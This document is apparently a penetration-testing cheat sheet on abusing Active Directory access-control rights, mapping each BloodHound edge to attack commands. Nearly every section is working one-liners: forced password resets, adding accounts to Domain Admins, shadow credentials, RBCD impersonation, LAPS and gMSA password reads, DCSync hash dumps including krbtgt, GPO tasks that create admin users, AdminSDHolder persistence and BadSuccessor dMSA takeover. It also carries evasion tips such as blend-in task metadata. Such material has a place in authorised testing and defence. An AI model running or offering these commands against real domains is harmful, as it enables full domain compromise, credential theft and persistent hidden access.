# AD - ACL / DACL Abuse

## Table of Contents
- [DACL / ACE Fundamentals](#dacl--ace-fundamentals)
- [Enumerating ACLs](#enumerating-acls)
- [Edge -> Tool -> Command Quick Map](#edge---tool---command-quick-map)
- [GenericAll](#genericall)
- [GenericWrite](#genericwrite)
- [WriteOwner](#writeowner)
- [WriteDACL](#writedacl)
- [Owns](#owns)
- [AllExtendedRights](#allextendedrights)
- [ForceChangePassword](#forcechangepassword)
- [AddMember (Group Write)](#addmember-group-write)
- [AddSelf](#addself)
- [WriteSPN (Targeted Kerberoast)](#writespn-targeted-kerberoast)
- [WriteAccountRestrictions](#writeaccountrestrictions)
- [AddKeyCredentialLink (Shadow Credentials)](#addkeycredentiallink-shadow-credentials)
- [AddAllowedToAct (RBCD)](#addallowedtoact-rbcd)
- [ReadLAPSPassword](#readlapspassword)
- [ReadGMSAPassword](#readgmsapassword)
- [DCSync Rights (GetChanges / GetChangesAll)](#dcsync-rights-getchanges--getchangesall)
- [GPO Edit Rights](#gpo-edit-rights)
- [OU-Level ACL & Inheritance Abuse](#ou-level-acl--inheritance-abuse)
- [AdminSDHolder](#adminsdholder)
- [dMSA Takeover (BadSuccessor)](#dmsa-takeover-badsuccessor)

For shadow-creds/RBCD reached via NTLM relay see [ntlm-relay.md](ntlm-relay.md). For certificate-based escalation (ESC) see [adcs.md](adcs.md). For the telemetry these writes generate (4662/5136/4670) see [opsec-and-detection.md](opsec-and-detection.md).

---

## DACL / ACE Fundamentals
Every AD object has a security descriptor with a DACL = ordered list of ACEs. Each ACE grants/denies a *right* (`ADS_RIGHTS_*` mask) to a *principal (SID)*, optionally scoped to an *object type* GUID (a property set or an extended right). Abuse = a principal you control holds a write/extended right over a more privileged object, which you convert into credential material or takeover.

Rights that matter:
- **GenericAll** = full control (superset of everything below).
- **GenericWrite / WriteProperty** = write attributes (SPN, key credentials, members, etc.).
- **WriteDacl** = rewrite the object's DACL (grant yourself GenericAll).
- **WriteOwner** = set yourself as owner (owner can rewrite DACL).
- **Self / AddSelf** = write the specific self-membership attribute.
- **ExtendedRight** GUIDs: `ForceChangePassword`, `DS-Replication-Get-Changes` (DCSync), `Read-LAPS`, etc.

Inheritance: an ACE on a container/OU with `INHERIT` flags applies to child objects — controlling an OU can mean controlling every user/computer under it.

## Enumerating ACLs
```bash
# BloodHound (edges are the fastest read). Collect:
bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All
#   Windows: SharpHound.exe -c All   /  Invoke-BloodHound -CollectionMethod All
# In UI: mark owned node, run "Shortest paths to Domain Admins" / inspect "Outbound Object Control".

# PowerView (Windows)
Get-DomainObjectAcl -Identity "target" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<your-SID>"}
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
    ? {$_.ActiveDirectoryRights -match "WriteDacl|GenericAll|WriteOwner"}
Get-ObjectAcl -SamAccountName victim -ResolveGUIDs         # older PowerView name

# dacledit.py (impacket) - read + write ACEs from Linux
dacledit.py -action read -target 'victim' -principal 'you' domain/user:pass
# owneredit.py - read/change object owner
owneredit.py -action read -target 'victim' domain/user:pass

# Native Windows
Get-Acl "AD:\CN=victim,CN=Users,DC=domain,DC=local" | Select -Expand Access
```

## Edge -> Tool -> Command Quick Map
| BloodHound edge | Prereq right | Primitive | Tool | One-liner (Linux impacket unless noted) |
|---|---|---|---|---|
| GenericAll (user) | full control | reset pw / shadow / kerberoast | net rpc / certipy | `net rpc password 'victim' 'New1!' -U 'domain/you%pass' -S <DC>` |
| GenericAll (computer) | full control | RBCD / shadow creds | rbcd.py / certipy | `rbcd.py -delegate-to 'victim$' -delegate-from 'you$' -action write domain/you:pass` |
| GenericAll (group) | full control | add member | net / dacledit | `net rpc group addmem "Grp" you -U 'domain/you%pass' -S <DC>` |
| GenericWrite (user) | WriteProperty | targeted kerberoast / shadow | targetedKerberoast | `targetedKerberoast.py -v -d domain -u you -p pass` |
| WriteDacl | write DACL | grant self GenericAll | dacledit | `dacledit.py -action write -rights FullControl -principal you -target victim domain/you:pass` |
| WriteOwner | set owner | own -> WriteDacl -> GenericAll | owneredit+dacledit | `owneredit.py -action write -new-owner you -target victim domain/you:pass` |
| ForceChangePassword | ExtendedRight | reset password | net rpc / rpcclient | `net rpc password 'victim' 'New1!' -U 'domain/you%pass' -S <DC>` |
| AddMember | WriteProperty(member) | join privileged group | net rpc / bloodyAD | `bloodyAD -u you -p pass -d domain --host <DC> add groupMember "Grp" you` |
| AddSelf | Self(member) | self-join group | bloodyAD | `bloodyAD ... add groupMember "Grp" you` |
| AddKeyCredentialLink | WriteProperty(keycred) | shadow creds -> PKINIT | certipy / pywhisker | `certipy shadow auto -u you@domain -p pass -account victim` |
| AllowedToAct | write mS-DS-AllowedToAct | RBCD -> impersonate | rbcd.py | `rbcd.py -delegate-to 'victim$' -delegate-from 'you$' -action write ...` |
| ReadLAPSPassword | Read (ms-Mcs-AdmPwd) | local admin pw | nxc / pyLAPS | `nxc ldap <DC> -u you -p pass -M laps` |
| ReadGMSAPassword | Read gMSA blob | gMSA NT hash | gMSADumper | `gMSADumper.py -u you -p pass -d domain` |
| DCSync (GetChangesAll) | ExtendedRight | dump all hashes | secretsdump | `secretsdump.py domain/you:pass@<DC> -just-dc` |
| GPO edit (GenericWrite on GPO) | WriteProperty | GPO -> SYSTEM on linked | pyGPOAbuse | `pygpoabuse.py domain/you:pass -gpo-id <GUID> -command 'cmd'` |

## GenericAll
Full control. On a **user**: reset password, add SPN and kerberoast, or add shadow creds. On a **computer**: shadow creds or configure RBCD. On a **group**: add a member.
```bash
# User -> reset password (loud but reliable)
net rpc password 'victim' 'Passw0rd!23' -U 'domain.local/you%pass' -S <DC>
rpcclient -U 'domain/you%pass' <DC> -c "setuserinfo2 victim 23 'Passw0rd!23'"
bloodyAD -u you -p pass -d domain.local --host <DC> set password victim 'Passw0rd!23'
# Prefer non-destructive: shadow creds (see AddKeyCredentialLink) leaves the account usable.
```

## GenericWrite
Write attributes but not DACL/owner. Cannot directly reset a password, but can: set an SPN (targeted kerberoast), set `msDS-KeyCredentialLink` (shadow creds), or set `logonScript`/RBCD depending on object.
```bash
# Targeted kerberoast: add SPN, roast, remove SPN
targetedKerberoast.py -v -d domain.local -u you -p pass         # does add/roast/cleanup automatically
# Manual (PowerView, Windows):
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}
Get-DomainSPNTicket -SamAccountName victim
Set-DomainObject -Identity victim -Clear serviceprincipalname
```

## WriteOwner
Make yourself owner; owner can then write the DACL to grant GenericAll.
```bash
owneredit.py -action write -new-owner you -target victim domain.local/you:pass
dacledit.py -action write -rights FullControl -principal you -target victim domain.local/you:pass
# Windows PowerView:
Set-DomainObjectOwner -Identity victim -OwnerIdentity you
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity you -Rights All
```

## WriteDACL
Rewrite the DACL directly to grant yourself GenericAll (or the exact right you need, e.g. DCSync on the domain object).
```bash
dacledit.py -action write -rights FullControl -principal you -target victim domain.local/you:pass
# Grant DCSync on the domain head:
dacledit.py -action write -rights DCSync -principal you -target-dn 'DC=domain,DC=local' domain.local/you:pass
# Windows:
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity you -Rights DCSync
```

## Owns
Being the object **owner** implies the implicit right to write the DACL (`WRITE_DAC`) regardless of the explicit ACEs. Convert exactly like WriteOwner's second step: `dacledit -action write -rights FullControl`.

## AllExtendedRights
Grants every extended right, including `User-Force-Change-Password` and (on the domain object) the DCSync replication rights. Treat like GenericAll for credential resets / DCSync.
```bash
# = ForceChangePassword on a user
net rpc password 'victim' 'New1!' -U 'domain/you%pass' -S <DC>
# = DCSync if held on the domain object
secretsdump.py domain/you:pass@<DC> -just-dc
```

## ForceChangePassword
The `User-Force-Change-Password` extended right: reset without knowing the old password.
```bash
net rpc password 'victim' 'Passw0rd!23' -U 'domain.local/you%pass' -S <DC>
rpcclient -U 'domain/you%pass' <DC> -c "setuserinfo2 victim 23 'Passw0rd!23'"
# Windows:
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'Passw0rd!23' -AsPlainText -Force)
```

## AddMember (Group Write)
`WriteProperty` on a group's `member` attribute → add yourself/anyone. Chain into Domain Admins / privileged groups.
```bash
net rpc group addmem "Domain Admins" you -U 'domain.local/you%pass' -S <DC>
bloodyAD -u you -p pass -d domain.local --host <DC> add groupMember "Domain Admins" you
# Windows:
Add-DomainGroupMember -Identity 'Domain Admins' -Members you
# Remove after use:
net rpc group delmem "Domain Admins" you -U 'domain.local/you%pass' -S <DC>
```

## AddSelf
`Self` write right on a group's membership — add only *yourself*. Same tooling as AddMember; `bloodyAD add groupMember` works.

## WriteSPN (Targeted Kerberoast)
Write to `servicePrincipalName` (a specific case of GenericWrite). Add an SPN so the account becomes kerberoastable, request the ticket, crack offline, then clear the SPN.
```bash
targetedKerberoast.py -v -d domain.local -u you -p pass         # -r victim to target one account
# Manual with impacket addspn.py + GetUserSPNs:
addspn.py -u domain/you -p pass -t victim -s 'fake/svc' <DC>
GetUserSPNs.py domain.local/you:pass -request-user victim
hashcat -m 13100 spn.hash wordlist.txt
```

## WriteAccountRestrictions
`Validated-Write` / write to `userAccountControl` account-restriction properties. Notably lets you toggle `msDS-SupportedEncryptionTypes` or clear/set flags. Practically used to set `TRUSTED_TO_AUTH_FOR_DELEGATION` or manipulate delegation-related restrictions on a computer you partly control; combine with RBCD/constrained delegation.
```bash
bloodyAD -u you -p pass -d domain.local --host <DC> add uac victim -f TRUSTED_FOR_DELEGATION
# Windows PowerView:
Set-DomainObject -Identity victim -XOR @{useraccountcontrol=524288}   # TRUSTED_FOR_DELEGATION
```

## AddKeyCredentialLink (Shadow Credentials)
Write `msDS-KeyCredentialLink` on a user/computer → attach an attacker-owned certificate → authenticate via PKINIT and recover the NT hash. Non-destructive (unlike a password reset). Requires domain functional level 2016+ and a KDC that supports PKINIT (ADCS/PKI not strictly required for the link itself). Prereq: GenericAll / GenericWrite / AddKeyCredentialLink over the target.
```bash
# certipy (all-in-one: add link, PKINIT, dump hash, cleanup)
certipy shadow auto -u you@domain.local -p pass -account victim
# pywhisker (Linux) - manage the link
pywhisker.py -d domain.local -u you -p pass --target victim --action add
#   then use the produced .pfx with gettgtpkinit.py / PKINITtools
gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass <pw> domain.local/victim victim.ccache
getnthash.py -key <as-rep-key> domain.local/victim   # recover NT hash via U2U
# Whisker (Windows / C#)
Whisker.exe add /target:victim /domain:domain.local /dc:dc01.domain.local
```

## AddAllowedToAct (RBCD)
Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a *computer* → configure Resource-Based Constrained Delegation so a computer account you control can impersonate any user to that computer. Prereq: GenericAll/GenericWrite over the target computer + control of a computer account with an SPN (create one if MachineAccountQuota>0).
```bash
# 1. (optional) add a computer you control
addcomputer.py -computer-name 'ATTACK$' -computer-pass 'Passw0rd!' domain.local/you:pass -dc-ip <DC>
# 2. write RBCD
rbcd.py -delegate-to 'victim$' -delegate-from 'ATTACK$' -action write domain.local/you:pass
#   or: bloodyAD -u you -p pass -d domain --host <DC> add rbcd 'victim$' 'ATTACK$'
# 3. impersonate
getST.py -spn cifs/victim.domain.local -impersonate Administrator domain.local/ATTACK$:'Passw0rd!'
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass victim.domain.local
```

## ReadLAPSPassword
Read `ms-Mcs-AdmPwd` (legacy LAPS) or the Windows LAPS attributes (`msLAPS-Password` / `msLAPS-EncryptedPassword`) → cleartext local admin password of the target computer.
```bash
nxc ldap <DC> -u you -p pass -M laps
pyLAPS.py --action get -d domain.local -u you -p pass
# Windows:
Get-DomainObject -Identity victim -Properties ms-Mcs-AdmPwd
Get-LapsADPassword -Identity victim -AsPlainText          # Windows LAPS module
```

## ReadGMSAPassword
Read the gMSA `msDS-ManagedPassword` blob (only principals in `PrincipalsAllowedToRetrieveManagedPassword`) → derive the gMSA's NT hash.
```bash
gMSADumper.py -u you -p pass -d domain.local
nxc ldap <DC> -u you -p pass --gmsa
bloodyAD -u you -p pass -d domain.local --host <DC> get object 'gmsa$' --attr msDS-ManagedPassword
# Windows:
$p = (Get-ADServiceAccount gmsa -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```

## DCSync Rights (GetChanges / GetChangesAll)
Holding `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (and often `-In-Filtered-Set`) on the domain object lets you replicate secrets = dump every hash including krbtgt. Grant via WriteDacl if you don't already have it.
```bash
secretsdump.py domain.local/you:pass@<DC> -just-dc                 # all hashes
secretsdump.py domain.local/you:pass@<DC> -just-dc-user krbtgt     # just krbtgt (golden ticket)
nxc smb <DC> -u you -p pass --ntds                                 # via drsuapi
# Windows (mimikatz):
lsadump::dcsync /domain:domain.local /user:krbtgt
# Grant DCSync to yourself first if needed:
dacledit.py -action write -rights DCSync -principal you -target-dn 'DC=domain,DC=local' domain.local/you:pass
```

## GPO Edit Rights
GenericWrite/GenericAll/WriteDacl/WriteOwner over a **GPO object** (or write access to its SYSVOL files) → push a scheduled/immediate task, a startup script, or a user-rights/restricted-groups change that runs as SYSTEM (computer GPO) or as the user, on **every object the GPO is linked to**. Separately, **WriteGPLink** on an OU/site/domain lets you *link a malicious GPO you own* to that scope without editing any existing GPO (see OU-Level ACL & Inheritance Abuse).

### Finding editable / abusable GPOs
```bash
# BloodHound edges: GenericWrite/GenericAll/WriteDacl/Owns on a GPO node, plus WriteGPLink on OUs.
#   Cypher: MATCH p=(u)-[:GenericWrite|GenericAll|WriteDacl|WriteOwner]->(g:GPO) RETURN p
#   Then inspect the GPO's "Affected Objects" tab for the exact computers/users in scope.
```
```powershell
# PowerView (Windows) - enumerate GPOs, your rights on them, and where they apply
Get-DomainGPO -Properties displayname,name,gpcfilesyspath        # list GPOs (name = {GUID})
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
    ? { $_.ActiveDirectoryRights -match 'WriteProperty|GenericWrite|GenericAll|WriteDacl|WriteOwner' -and
        $_.SecurityIdentifier -eq '<your-SID>' }
# Resolve a GPO's linked scope BEFORE abusing it (blast radius):
Get-DomainOU  -GPLink '<GPO-GUID>' | Select name,distinguishedname     # OUs it is linked to
Get-DomainGPO -Identity '<GPO-GUID>' | Select displayname,gpcfilesyspath
Get-DomainComputer -SearchBase 'OU=Workstations,DC=corp,DC=local' | measure   # count affected hosts
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity <host>  # who gets local admin via GPO
```
```bash
# Linux: bloodyAD / pyGPOAbuse can enumerate; or ldapsearch for gPLink on OUs you can write
ldapsearch -x -H ldap://<DC> -b 'DC=corp,DC=local' '(objectClass=groupPolicyContainer)' cn displayName gPCFileSysPath
```

### Abusing GPO edit rights
```powershell
# SharpGPOAbuse (Windows / C#) - pick the primitive that matches the GPO's scope
# 1) Immediate scheduled task as SYSTEM on every COMPUTER the GPO applies to (loud, reliable)
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin \
    --Command "cmd.exe" --Arguments "/c net localgroup administrators you /add" --GPOName "VulnGPO"
#    --FilterEnabled --TargetDnsName ws01.corp.local  -> restrict the task to ONE host (blast-radius control)
# 2) Immediate task as the logged-on USER (for a user-scoped GPO)
SharpGPOAbuse.exe --AddUserTask --TaskName "Upd" --Author DOMAIN\Admin \
    --Command "cmd.exe" --Arguments "/c powershell -enc <b64>" --GPOName "VulnUserGPO"
# 3) Grant a privilege via user-rights assignment (e.g. make you a right-holder, no task needed)
SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege,SeTakeOwnershipPrivilege" \
    --UserAccount you --GPOName "VulnGPO"
# 4) Add yourself to the local Administrators group of affected computers (Restricted Groups)
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount you --GPOName "VulnGPO"
```
```bash
# pyGPOAbuse (Linux) - partial port; creates an IMMEDIATE scheduled task (SYSTEM for computer GPO,
# logged-on user for user GPO) and self-deletes after first run. Targets computer GPO by default.
pygpoabuse.py corp.local/you:'Passw0rd!' -gpo-id <GPO-GUID> \
    -command 'net user hacker Passw0rd! /add && net localgroup administrators hacker /add'
pygpoabuse.py corp.local/you -hashes :<NThash> -gpo-id <GPO-GUID> \
    -command 'powershell -enc <b64>' -taskname "Update" -author 'DOMAIN\Admin'   # blend-in metadata
pygpoabuse.py corp.local/you:'Passw0rd!' -gpo-id <GPO-GUID> -command '<cmd>' \
    -filter-enabled -target-dns-name ws01.corp.local     # scope task to one host
pygpoabuse.py corp.local/you:'Passw0rd!' -gpo-id <GPO-GUID> -f           # -f: skip the confirmation prompt
```

### Immediate scheduled task & timing
- **Immediate task** = a scheduled task with a "run as soon as possible" trigger written into the GPO's SYSVOL preferences (`...\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml`). It fires on the next Group Policy refresh, runs once, then removes itself — the fastest GPO-to-exec primitive.
- **Timing**: clients refresh policy roughly **every 90 min + 0-30 min random offset** (DCs every 5 min). You do **not** control when a target refreshes — either wait for the cycle, or force it if you already have a session on the box: `gpupdate /force` (or `Invoke-GPUpdate -Computer <host>` remotely if you hold the rights). Editing the GPO also bumps `gPCMachineExtensionNames`/version so clients pick up the CSE change.
- After the task lands and runs, **revert**: delete the task/XML from SYSVOL (SharpGPOAbuse leaves the deployment; pyGPOAbuse's `--cleanup`/self-delete helps), and undo `--AddLocalAdmin`/`--AddUserRights` changes — these persist across every refresh until removed. Generates **5136** (gPCMachineExtensionNames change) and **5145** (SYSVOL file write); see opsec-and-detection.md.

## OU-Level ACL & Inheritance Abuse
Write rights on an **OU** propagate to child objects when the ACE is inheritable. Add an inheritable ACE granting yourself GenericAll over descendant user/computer objects.
```bash
# Grant inheritable FullControl over an OU -> all children (dacledit propagates via inheritance flag)
dacledit.py -action write -rights FullControl -inheritance \
    -principal you -target-dn 'OU=Workstations,DC=domain,DC=local' domain.local/you:pass
# Windows PowerView:
Add-DomainObjectAcl -TargetIdentity 'OU=Workstations,DC=domain,DC=local' \
    -PrincipalIdentity you -Rights All
# Then abuse any child (e.g. reset a user under the OU, or RBCD a computer under it).
```
Also watch for **gPLink** write on an OU: you can link a malicious GPO to the OU without editing an existing GPO.

## AdminSDHolder
`CN=AdminSDHolder,CN=System` is the template DACL that SDProp (runs ~hourly) stamps onto all protected (`adminCount=1`) principals, overwriting their DACLs. Writing an ACE here = persistent GenericAll over Domain Admins et al. — a persistence primitive, not just escalation.
```bash
# Add yourself GenericAll on AdminSDHolder (Linux)
dacledit.py -action write -rights FullControl -principal you \
    -target-dn 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' domain.local/you:pass
# Windows PowerView:
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' \
    -PrincipalIdentity you -Rights All
# SDProp then propagates to Domain Admins / Enterprise Admins / etc. within ~60 min.
# Force propagation (Windows, with rights): run runSDProp via ldp / or wait for the cycle.
```

## dMSA Takeover (BadSuccessor)
**Windows Server 2025-specific** (CVE-2025-53779, Akamai/Yuval Gordon). Abuses the delegated Managed Service Account (dMSA) *migration* workflow: writing the migration attributes on a dMSA makes the KDC treat that dMSA as the **successor** of a target account, so the PAC/keys it is issued inherit the target's group memberships and privileges. **No control over the target is required** — only write over a dMSA in an OU you control. Works against any principal, including Domain Admins.

Attributes set on the attacker-controlled dMSA:
- `msDS-ManagedAccountPrecededByLink` = DN of the target (superseded) account, e.g. `CN=Administrator,CN=Users,DC=domain,DC=local`.
- `msDS-DelegatedMSAState` = `2` (migration completed) — makes the KDC honor the succession and hand the dMSA the target's keys.

Required permission: write on those attributes of a dMSA — practically **`CreateChild` for `msDS-DelegatedManagedServiceAccount` on an OU** (create your own dMSA) or GenericWrite/WriteProperty on an existing dMSA. Akamai's `Get-BadSuccessorOUPermissions.ps1` finds which principals hold that on which OUs.
```
:: SharpSuccessor (Windows / C#) - creates the dMSA and sets both migration attributes
SharpSuccessor.exe add /impersonate:Administrator /path:"OU=Svc,DC=domain,DC=local" /account:you /name:evil_dmsa
:: then Rubeus to request the dMSA TGT (KERB-DMSA-KEY-PACKAGE carries the target's keys) and PtT
```
```bash
# BloodyAD (Linux) - one-shot dMSA succession creation
bloodyAD -d domain.local -u you -p pass --host <DC> add badSuccessor evil_dmsa
# then request the dMSA's TGT and use its inherited keys
```
References: Akamai "BadSuccessor" research, Unit 42 write-up, HackTricks BadSuccessor. Patched Aug 2025 — see BetterSuccessor for post-patch variants.
